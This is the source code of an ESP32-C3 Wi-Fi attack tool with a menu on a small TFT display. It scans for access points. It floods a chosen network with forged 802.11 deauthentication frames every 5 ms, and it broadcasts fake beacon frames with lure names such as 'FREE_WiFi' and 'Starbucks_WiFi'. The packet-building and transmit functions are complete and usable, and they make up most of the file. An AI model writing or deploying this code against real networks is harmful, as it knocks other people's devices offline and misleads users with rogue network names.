/*
 * RF TOOL v6.0 - Wi-Fi Only (Bruce Style UI)
 * ESP32-C3 Supermini
 * - Справжнє скроловане меню (як у смартфоні)
 * - Виправлений Beacon Spammer
 * - Правильне відображення списків
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ====================== Піни ======================
#define TFT_CS      5
#define TFT_DC      6
#define TFT_RST     7
#define TFT_MOSI    10
#define TFT_SCLK    8

#define BTN_UP      1
#define BTN_DOWN    20
#define BTN_SEL     3
#define BTN_BACK    0

// ====================== Кольори ======================
#define BG_COLOR        ST77XX_BLACK
#define HEADER_COLOR    ST77XX_CYAN
#define SELECTED_COLOR  ST77XX_YELLOW
#define TEXT_COLOR      ST77XX_WHITE
#define ALERT_COLOR     ST77XX_RED
#define SUCCESS_COLOR   ST77XX_GREEN
#define LINE_COLOR      ST77XX_BLUE

// ====================== Об'єкти ======================
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

// ====================== Стани меню ======================
enum AppState {
  MAIN_MENU,
  WIFI_SCAN,
  WIFI_DEAUTH,
  WIFI_BEACON,
  SETTINGS
};

AppState currentState = MAIN_MENU;

// Головне меню
const char* mainMenuItems[] = {"Wi-Fi Scan", "Deauth", "Beacon Spam", "Settings"};
const uint8_t mainMenuSize = 4;
int8_t mainMenuIndex = 0;

// Налаштування Beacon
const char* beaconSSIDs[] = {"FREE_WiFi", "AndroidAP", "iPhone", "Starbucks_WiFi", "McDonalds Free"};
const uint8_t beaconCount = 5;
uint8_t beaconIndex = 0;
bool beaconActive = false;

// Wi-Fi дані
int apCount = 0;
String apList[50];
uint8_t apBSSID[50][6];
int apChannel[50];
int selectedAP = 0;

// Стани атак
bool deauthActive = false;
unsigned long lastPacket = 0;
unsigned long packetCount = 0;

// ====================== Прототипи функцій ======================
void drawHeader(const char* title);
void drawMainMenu();
void drawWiFiScanList();
void drawWiFiDeauthScreen();
void drawBeaconScreen();
void drawSettingsScreen();
void drawButtonHints(const char* hints);
void handleNavigation();
void startWiFiScan();
void startDeauth();
void stopDeauth();
void startBeacon();
void stopBeacon();
void sendBeaconPacket(const char* ssid);
void sendDeauthPacket(uint8_t* bssid, int channel);

// ====================== Setup ======================
void setup() {
  Serial.begin(115200);
  delay(500);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  SPI.begin(TFT_SCLK, -1, TFT_MOSI);

  tft.initR(INITR_MINI160x80);
  tft.setRotation(1);
  tft.fillScreen(BG_COLOR);
  tft.setTextWrap(false);

  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 20);
  tft.print("TFT OK!");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Wi-Fi init...");

  WiFi.mode(WIFI_STA);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 50);
  tft.print("Ready!");

  delay(1000);
  drawMainMenu();
}

// ====================== Головний цикл ======================
void loop() {
  handleNavigation();

  // Deauth attack
  if (currentState == WIFI_DEAUTH && deauthActive) {
    if (millis() - lastPacket >= 5) {
      lastPacket = millis();
      sendDeauthPacket(apBSSID[selectedAP], apChannel[selectedAP]);
      packetCount++;
    }
  }

  // Beacon spam
  if (currentState == WIFI_BEACON && beaconActive) {
    static unsigned long lastBeacon = 0;
    static unsigned long lastDisplayUpdate = 0;
    static unsigned long beaconCount_local = 0;
    
    if (millis() - lastBeacon >= 50) {
      lastBeacon = millis();
      sendBeaconPacket(beaconSSIDs[beaconIndex]);
      beaconCount_local++;
    }
    
    if (millis() - lastDisplayUpdate >= 500) {
      lastDisplayUpdate = millis();
      packetCount = beaconCount_local;
      // Оновлюємо тільки лічильник
      tft.fillRect(10, 85, 140, 15, BG_COLOR);
      tft.setCursor(10, 85);
      tft.setTextColor(TEXT_COLOR);
      tft.print("Sent: ");
      tft.print(packetCount);
    }
  }

  delay(5);
}

// ====================== Функції малювання ======================
void drawHeader(const char* title) {
  tft.fillRect(0, 0, 160, 15, HEADER_COLOR);
  tft.setTextColor(BG_COLOR);
  tft.setTextSize(1);
  tft.setCursor(3, 4);
  tft.print(title);
  tft.drawFastHLine(0, 15, 160, LINE_COLOR);
}

void drawButtonHints(const char* hints) {
  tft.fillRect(0, 145, 160, 15, BG_COLOR);
  tft.setTextColor(ST77XX_CYAN);
  tft.setTextSize(1);
  tft.setCursor(2, 148);
  tft.print(hints);
}

void drawMainMenu() {
  tft.fillScreen(BG_COLOR);
  drawHeader("RF TOOL v6.0");
  
  const char* icons[] = {"[S]", "[D]", "[B]", "[#]"};
  
  // Фіксована позиція курсора - завжди другий рядок
  const int CURSOR_Y = 42;
  
  // Визначаємо зміщення списку
  int scrollOffset = 0;
  if (mainMenuIndex > 1) scrollOffset = mainMenuIndex - 1;
  if (scrollOffset > mainMenuSize - 3) scrollOffset = mainMenuSize - 3;
  
  // Малюємо видимі пункти (максимум 3)
  for (int i = scrollOffset; i < mainMenuSize && i < scrollOffset + 3; i++) {
    int displayIndex = i - scrollOffset;
    int y = 25 + displayIndex * 25;
    
    if (i == mainMenuIndex) {
      // Виділений пункт
      tft.fillRoundRect(5, y-2, 150, 20, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(15, y);
    tft.print(icons[i]);
    tft.setCursor(40, y);
    tft.print(mainMenuItems[i]);
  }
  
  drawButtonHints("UP/DN:nav  SEL:enter");
}

void startWiFiScan() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Scanning...");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 40);
  tft.print("Searching APs...");
  
  apCount = WiFi.scanNetworks();
  
  for (int i = 0; i < apCount && i < 50; i++) {
    apList[i] = WiFi.SSID(i);
    if (apList[i].length() == 0) apList[i] = "[Hidden Network]";
    apChannel[i] = WiFi.channel(i);
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();
  
  selectedAP = 0;
  drawWiFiScanList();
}

void drawWiFiScanList() {
  tft.fillScreen(BG_COLOR);
  
  char header[20];
  snprintf(header, 20, "APs: %d", apCount);
  drawHeader(header);
  
  if (apCount == 0) {
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 40);
    tft.print("No networks found");
    drawButtonHints("BACK:return");
    return;
  }
  
  // Визначаємо зміщення для скролу
  int scrollOffset = 0;
  if (selectedAP > 2) scrollOffset = selectedAP - 2;
  if (scrollOffset > apCount - 5) scrollOffset = apCount - 5;
  if (scrollOffset < 0) scrollOffset = 0;
  
  // Малюємо видимі мережі (максимум 8)
  for (int i = scrollOffset; i < apCount && i < scrollOffset + 8; i++) {
    int y = 20 + (i - scrollOffset) * 14;
    if (y > 140) break;
    
    if (i == selectedAP) {
      tft.fillRect(3, y-2, 154, 13, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(5, y);
    
    // Скорочуємо довгі імена
    String displayName = apList[i];
    if (displayName.length() > 14) {
      displayName = displayName.substring(0, 12) + "..";
    }
    tft.print(displayName);
    
    // Додаємо канал
    tft.print(" [");
    tft.print(apChannel[i]);
    tft.print("]");
  }
  
  drawButtonHints("UP/DN:nav  SEL:select  BACK:back");
}

void drawWiFiDeauthScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Deauth Attack");
  
  if (apCount == 0) {
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 40);
    tft.print("No AP selected!");
    tft.setCursor(10, 55);
    tft.print("Run scan first!");
    drawButtonHints("BACK:return");
    return;
  }
  
  tft.setTextColor(ALERT_COLOR);
  tft.setCursor(5, 25);
  tft.print("Target:");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 40);
  String displayName = apList[selectedAP];
  if (displayName.length() > 18) {
    displayName = displayName.substring(0, 16) + "..";
  }
  tft.print(displayName);
  
  tft.setCursor(5, 55);
  tft.print("Channel: ");
  tft.print(apChannel[selectedAP]);
  
  tft.setTextColor(deauthActive ? SUCCESS_COLOR : TEXT_COLOR);
  tft.setCursor(5, 75);
  tft.print("Status: ");
  tft.print(deauthActive ? "ACTIVE" : "Idle");
  
  if (deauthActive) {
    tft.setCursor(5, 90);
    tft.print("Packets: ");
    tft.print(packetCount);
  } else {
    tft.setCursor(5, 90);
    tft.print("Press SEL to start");
  }
  
  drawButtonHints("SEL:start/stop  BACK:back");
}

void drawBeaconScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Beacon Spammer");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 25);
  tft.print("SSID:");
  
  // Виділяємо SSID
  tft.setTextColor(SELECTED_COLOR);
  tft.setCursor(5, 40);
  String displayName = beaconSSIDs[beaconIndex];
  if (displayName.length() > 18) {
    displayName = displayName.substring(0, 16) + "..";
  }
  tft.print(displayName);
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 60);
  tft.print("Status: ");
  if (beaconActive) {
    tft.setTextColor(SUCCESS_COLOR);
    tft.print("SPAMMING");
  } else {
    tft.setTextColor(TEXT_COLOR);
    tft.print("Idle");
  }
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 80);
  tft.print("Sent: ");
  tft.print(packetCount);
  
  drawButtonHints("SEL:start/stop  L/R:SSID  BACK:back");
}

void drawSettingsScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Settings");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 25);
  tft.print("Select Beacon SSID:");
  
  // Показуємо список SSID зі скролом
  int scrollOffset = 0;
  if (beaconIndex > 2) scrollOffset = beaconIndex - 2;
  if (scrollOffset > beaconCount - 5) scrollOffset = beaconCount - 5;
  if (scrollOffset < 0) scrollOffset = 0;
  
  for (int i = scrollOffset; i < beaconCount && i < scrollOffset + 6; i++) {
    int y = 40 + (i - scrollOffset) * 15;
    if (y > 135) break;
    
    if (i == beaconIndex) {
      tft.fillRoundRect(5, y-2, 150, 14, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(10, y);
    
    String displayName = beaconSSIDs[i];
    if (displayName.length() > 16) {
      displayName = displayName.substring(0, 14) + "..";
    }
    tft.print(displayName);
  }
  
  drawButtonHints("UP/DN:select  BACK:back");
}

// ====================== Функції атак ======================
void startDeauth() {
  deauthActive = true;
  packetCount = 0;
  esp_wifi_set_channel(apChannel[selectedAP], WIFI_SECOND_CHAN_NONE);
  drawWiFiDeauthScreen();
}

void stopDeauth() {
  deauthActive = false;
  drawWiFiDeauthScreen();
}

void startBeacon() {
  beaconActive = true;
  packetCount = 0;
  drawBeaconScreen();
}

void stopBeacon() {
  beaconActive = false;
  drawBeaconScreen();
}

void sendDeauthPacket(uint8_t* bssid, int channel) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void sendBeaconPacket(const char* ssid) {
  // Спрощена версія Beacon frame
  uint8_t packet[64];
  int ssidLen = strlen(ssid);
  
  // Заповнюємо нулями
  memset(packet, 0, 64);
  
  // Frame Control (Beacon)
  packet[0] = 0x80;
  packet[1] = 0x00;
  
  // Duration
  packet[2] = 0x00;
  packet[3] = 0x00;
  
  // Destination (Broadcast)
  for (int i = 4; i < 10; i++) packet[i] = 0xFF;
  
  // Source (Random MAC)
  for (int i = 10; i < 16; i++) packet[i] = random(0, 255);
  packet[10] &= 0xFE; // Unicast bit = 0
  
  // BSSID (same as source)
  memcpy(packet + 16, packet + 10, 6);
  
  // Sequence control
  packet[22] = random(0, 255);
  packet[23] = random(0, 255);
  
  // Timestamp (8 bytes)
  for (int i = 24; i < 32; i++) packet[i] = random(0, 255);
  
  // Beacon interval (100ms = 0x0064)
  packet[32] = 0x64;
  packet[33] = 0x00;
  
  // Capability info
  packet[34] = 0x21;
  packet[35] = 0x04;
  
  // SSID tag
  int pos = 36;
  packet[pos++] = 0x00; // SSID tag
  packet[pos++] = ssidLen;
  memcpy(packet + pos, ssid, ssidLen);
  pos += ssidLen;
  
  // Supported rates
  packet[pos++] = 0x01; // Rates tag
  packet[pos++] = 0x04; // Length
  packet[pos++] = 0x82; // 1 Mbps
  packet[pos++] = 0x84; // 2 Mbps
  packet[pos++] = 0x8B; // 5.5 Mbps
  packet[pos++] = 0x96; // 11 Mbps
  
  // DS Parameter (channel 1)
  packet[pos++] = 0x03; // DS tag
  packet[pos++] = 0x01; // Length
  packet[pos++] = 0x01; // Channel 1
  
  // Відправляємо пакет
  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ====================== Навігація ======================
void handleNavigation() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 150) return;
  
  bool up   = digitalRead(BTN_UP) == LOW;
  bool down = digitalRead(BTN_DOWN) == LOW;
  bool sel  = digitalRead(BTN_SEL) == LOW;
  bool back = digitalRead(BTN_BACK) == LOW;
  
  if (!up && !down && !sel && !back) return;
  lastPress = millis();
  
  // BACK
  if (back) {
    if (currentState == MAIN_MENU) return;
    
    if (deauthActive) stopDeauth();
    if (beaconActive) stopBeacon();
    
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  
  // Обробка для кожного стану
  switch (currentState) {
    case MAIN_MENU:
      if (up && mainMenuIndex > 0) {
        mainMenuIndex--;
        drawMainMenu();
      }
      if (down && mainMenuIndex < mainMenuSize - 1) {
        mainMenuIndex++;
        drawMainMenu();
      }
      
      if (sel) {
        switch (mainMenuIndex) {
          case 0:
            startWiFiScan();
            currentState = WIFI_SCAN;
            break;
          case 1:
            if (apCount == 0) startWiFiScan();
            currentState = WIFI_DEAUTH;
            drawWiFiDeauthScreen();
            break;
          case 2:
            currentState = WIFI_BEACON;
            drawBeaconScreen();
            break;
          case 3:
            currentState = SETTINGS;
            drawSettingsScreen();
            break;
        }
      }
      break;
      
    case WIFI_SCAN:
      if (apCount == 0) break;
      if (up && selectedAP > 0) {
        selectedAP--;
        drawWiFiScanList();
      }
      if (down && selectedAP < apCount - 1) {
        selectedAP++;
        drawWiFiScanList();
      }
      
      if (sel) {
        currentState = WIFI_DEAUTH;
        drawWiFiDeauthScreen();
      }
      break;
      
    case WIFI_DEAUTH:
      if (sel) {
        if (apCount == 0) {
          tft.fillScreen(BG_COLOR);
          drawHeader("Error");
          tft.setTextColor(ALERT_COLOR);
          tft.setCursor(10, 40);
          tft.print("Run scan first!");
          delay(1500);
          currentState = MAIN_MENU;
          drawMainMenu();
        } else {
          if (deauthActive) stopDeauth();
          else startDeauth();
        }
      }
      break;
      
    case WIFI_BEACON:
      if (up && beaconIndex > 0) {
        beaconIndex--;
        drawBeaconScreen();
      }
      if (down && beaconIndex < beaconCount - 1) {
        beaconIndex++;
        drawBeaconScreen();
      }
      if (sel) {
        if (beaconActive) stopBeacon();
        else startBeacon();
        drawBeaconScreen();
      }
      break;
      
    case SETTINGS:
      if (up && beaconIndex > 0) {
        beaconIndex--;
        drawSettingsScreen();
      }
      if (down && beaconIndex < beaconCount - 1) {
        beaconIndex++;
        drawSettingsScreen();
      }
      break;
  }
}